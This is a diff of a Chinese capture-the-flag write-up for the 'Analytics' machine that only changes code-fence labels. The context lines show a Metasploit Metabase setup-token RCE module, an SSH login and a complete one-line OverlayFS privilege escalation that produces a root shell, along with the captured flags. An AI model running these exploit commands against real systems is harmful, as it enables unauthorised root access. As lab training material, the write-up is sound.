@@ -51,7 +51,7 @@ Server: nginx/1.18.0 (Ubuntu)
 
 已知 Metabase 存在 CVE 漏洞，所以可以直接使用 Metasploit 进行攻击
 
-```shell
+```bash
 msf6 exploit(linux/http/metabase_setup_token_rce) > show options
 
 Module options (exploit/linux/http/metabase_setup_token_rce):
@@ -214,7 +214,7 @@ META_USER=metalytics
 
 ## User - metalytics
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ pwncat-cs metalytics@10.10.11.233
 [10:02:02] Welcome to pwncat 🐈!
@@ -227,14 +227,14 @@ metalytics
 
 ### flag - user
 
-```shell
+```bash
 (remote) metalytics@analytics:/home/metalytics$ cat user.txt
 53039b0f294045968eda95de651b4669
 ```
 
 ### 环境探测
 
-```shell
+```bash
 (remote) metalytics@analytics:/home/metalytics$ uname -a
 Linux analytics 6.2.0-25-generic #25~22.04.2-Ubuntu SMP PREEMPT_DYNAMIC Wed Jun 28 09:55:23 UTC 2 x86_64 x86_64 x86_64 GNU/Linux
 ```
@@ -243,7 +243,7 @@ Linux analytics 6.2.0-25-generic #25~22.04.2-Ubuntu SMP PREEMPT_DYNAMIC Wed Jun 
 
 ## User - root
 
-```shell
+```bash
 (remote) metalytics@analytics:/home/metalytics$ unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'
 root@analytics:~# whoami
 root
@@ -251,7 +251,7 @@ root
 
 ### flag - root
 
-```shell
+```bash
 root@analytics:/root# cat root.txt
 0f7d6fee56e47daabdf41eafb9b0ae3e
 ```
